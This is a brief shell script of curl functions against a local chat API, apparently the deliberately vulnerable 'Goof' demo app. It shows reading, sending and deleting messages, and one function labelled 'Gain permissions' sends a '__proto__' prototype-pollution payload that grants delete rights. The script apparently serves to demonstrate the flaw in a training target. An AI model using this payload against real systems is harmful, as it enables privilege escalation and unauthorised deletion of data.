# Working via curl

if [ -z "$GOOF_HOST" ]; then
    export GOOF_HOST=http://localhost:3001
fi

# Read messages
c1()
{
    curl --request GET --url "$GOOF_HOST/chat"
}

# Send message
c2()
{
    curl --request PUT \
      --url "$GOOF_HOST/chat" \
      --header 'content-type: application/json' \
      --data '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'
}

# Gain permissions
c3()
{
    curl --request PUT \
      --url "$GOOF_HOST/chat" \
      --header 'content-type: application/json' \
      --data '{"auth": {"name": "user", "password": "pwd"}, "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
}

# Delete message
c4()
{
    curl --request DELETE \
      --url "$GOOF_HOST/chat" \
      --header 'content-type: application/json' \
      --data '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
}
